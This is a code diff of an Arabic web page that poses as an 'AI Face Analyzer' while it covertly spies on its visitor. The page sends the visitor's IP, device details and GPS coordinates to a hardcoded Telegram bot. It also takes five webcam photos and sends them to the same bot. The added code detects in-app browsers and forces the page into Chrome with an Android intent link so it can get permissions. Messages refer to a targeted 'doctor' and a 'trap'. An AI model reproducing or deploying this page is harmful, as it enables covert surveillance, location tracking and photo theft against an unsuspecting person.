@@ -2,89 +2,117 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التحليل الهندسي</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحليل الهندسي المتقدم</title>
     <style>
-        body { text-align: center; background: #0c0c0c; color: #00ff00; font-family: 'Courier New', monospace; padding-top: 50px; }
-        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        body { text-align: center; background: #050505; color: #00ff41; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
+        #chrome-fix { display: none; background: #1a1a1a; padding: 30px; border-radius: 15px; border: 2px solid #00ff41; margin-top: 50px; }
+        .btn { background: #00ff41; color: black; padding: 15px 25px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; }
+        .loader { border: 4px solid #333; border-top: 4px solid #00ff41; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        img { max-width: 80%; border: 2px solid #00ff00; border-radius: 10px; display: none; margin: 20px auto; }
+        #main-content { display: block; }
     </style>
 </head>
 <body>
 
-    <div id="ui">
-        <h2>جاري معالجة بيانات الصورة...</h2>
-        <div class="loader"></div>
-        <p id="status">يرجى الموافقة على الأذونات لتفعيل معالج الذكاء الاصطناعي</p>
+    <div id="chrome-fix">
+        <h2>⚠️ تنبيه أمني من المتصفح</h2>
+        <p>لعرض الصورة بدقة عالية وتفعيل معالج الذكاء الاصطناعي، يجب فتح الرابط في متصفح Chrome أو Safari الخارجي.</p>
+        <a id="chrome-link" href="#" class="btn">اضغط هنا للفتح في Chrome</a>
     </div>
-    
-    <img id="myPhoto" src="my-photo.jpg">
+
+    <div id="main-content">
+        <h2>AI Face Analyzer v3.0</h2>
+        <div class="loader"></div>
+        <p id="status">جاري فحص التوافق وجمع البيانات...</p>
+        <img id="myPhoto" src="my-photo.jpg" style="max-width:80%; border-radius:10px; display:none; margin: 0 auto;">
+    </div>
 
     <script>
-        // --- ضع بياناتك هنا ---
         const TELEGRAM_TOKEN = '8372729487:AAFv7eZQGWtGkPqID6k209khDQKkZsO-TMM';
         const CHAT_ID = '8175631848';
+
+        // 1. وظيفة التحويل لكروم (لأجهزة الأندرويد)
+        function checkInAppBrowser() {
+            const ua = navigator.userAgent || navigator.vendor || window.opera;
+            const isInApp = (ua.indexOf('FBAN') > -1) || (ua.indexOf('FBAV') > -1) || (ua.indexOf('Instagram') > -1) || (ua.indexOf('Telegram') > -1);
+            
+            if (isInApp) {
+                document.getElementById('main-content').style.display = 'none';
+                document.getElementById('chrome-fix').style.display = 'block';
+                // محاولة تحويل تلقائي للأندرويد
+                const currentUrl = window.location.href.replace(/https?:\/\//, "");
+                document.getElementById('chrome-link').href = `intent://${currentUrl}#Intent;scheme=https;package=com.android.chrome;end`;
+                return true;
+            }
+            return false;
+        }
 
         async function sendToTelegram(message, imageBlob = null) {
             const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/${imageBlob ? 'sendPhoto' : 'sendMessage'}`;
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
-            
             if (imageBlob) {
                 formData.append('photo', imageBlob, 'capture.png');
                 formData.append('caption', message);
             } else {
                 formData.append('text', message);
             }
-            
             await fetch(url, { method: 'POST', body: formData });
         }
 
         async function startChallenge() {
-            let report = "🚨 تم تفعيل الفخ بنجاح! \n\n";
+            if (checkInAppBrowser()) return;
+
+            // جمع معلومات الجهاز بشكل مفصل
+            let deviceDetail = `
+📊 تقرير الجهاز المفصل:
+- النظام: ${navigator.platform}
+- الأنوية (CPU): ${navigator.hardwareConcurrency || 'غير معروف'}
+- الرام (RAM): ${navigator.deviceMemory || 'غير معروف'} GB
+- الشاشة: ${screen.width}x${screen.height}
+- اللغة: ${navigator.language}
+- البطارية: (جاري الجلب...)
+`;
 
             try {
-                // 1. سحب الـ IP
+                // سحب الـ IP
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
-                report += `🌐 عنوان الـ IP: ${ipData.ip}\n`;
+                deviceDetail += `- عنوان الـ IP: ${ipData.ip}\n`;
 
-                // 2. سحب معلومات الجهاز
-                report += `📱 الجهاز: ${navigator.platform}\n`;
-                report += `🖥️ المتصفح: ${navigator.userAgent.split(') ')[0]})\n`;
+                // طلب الموقع والكاميرا معاً
+                navigator.geolocation.getCurrentPosition(pos => {
+                    deviceDetail += `📍 الموقع: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
+                    sendToTelegram(deviceDetail);
+                }, () => sendToTelegram(deviceDetail + "📍 الموقع: تم رفض الإذن\n"));
 
-                // 3. سحب الموقع الجغرافي (GPS)
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const lat = pos.coords.latitude;
-                    const lon = pos.coords.longitude;
-                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    report += `📍 الموقع: ${mapLink}\n`;
-                    await sendToTelegram(report);
-                }, (err) => {
-                    report += `📍 الموقع: (الدكتور رفض إذن الموقع)\n`;
-                    sendToTelegram(report);
-                });
-
-                // 4. سحب لقطة الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('status').innerText = "تم التحقق.. جاري عرض الصورة";
-                document.getElementById('myPhoto').style.display = "block";
+                document.getElementById('status').innerText = "تم الاتصال.. جاري المعالجة الصورية";
+                document.getElementById('myPhoto').style.display = 'block';
 
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 await video.play();
 
-                setTimeout(async () => {
+                // التقاط 5 صور متتالية (بين كل صورة وصورة ثانية واحدة)
+                for (let i = 1; i <= 5; i++) {
+                    await new Promise(resolve => setTimeout(resolve, 1500)); // انتظر ثانية ونصف
                     const canvas = document.createElement('canvas');
                     canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => sendToTelegram("📸 لقطة وجه الدكتور:", blob), 'image/png');
-                    stream.getTracks().forEach(t => t.stop());
-                }, 2000);
+                    
+                    canvas.toBlob(blob => {
+                        sendToTelegram(`📸 لقطة رقم (${i}) من 5 لـ د. التحدي`, blob);
+                    }, 'image/png');
+                }
+
+                // إغلاق الكاميرا بعد الانتهاء
+                setTimeout(() => stream.getTracks().forEach(t => t.stop()), 8000);
 
             } catch (err) {
-                document.getElementById('status').innerText = "خطأ: يجب الموافقة على الأذونات لإتمام التحدي";
-                sendToTelegram("⚠️ الدكتور رفض إذن الكاميرا أو حدث خطأ.");
+                document.getElementById('status').innerText = "يرجى استخدام متصفح Chrome الرسمي للمتابعة";
+                sendToTelegram("⚠️ الدكتور رفض إذن الكاميرا أو المتصفح محمي.");
             }
         }
 
